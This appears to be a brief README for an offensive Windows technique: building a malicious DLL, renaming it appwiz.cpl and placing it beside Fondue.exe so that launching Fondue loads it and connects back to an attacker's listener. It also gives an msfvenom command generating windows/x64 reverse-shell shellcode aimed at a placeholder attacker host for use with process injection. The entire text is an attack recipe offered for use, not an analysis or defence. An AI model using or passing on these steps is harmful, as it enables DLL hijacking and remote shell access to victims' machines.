1 - Create DLL on Visual Studio

2 - Copy .cpp to visual Studio

3 - Replace the str variable by the command you want to execute on the attacker machine. Replace server ip and server port 

4 - Build it, rename it as appwiz.cpl and save it in the same folder as Fondue.exe and execute fondue

5 - On attacker side, listen on the port specified in the .cpp

If using process migration / process injection, change the payload with:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKERIP LPORT=ATTACKERPORT -f c
replace the shellcode
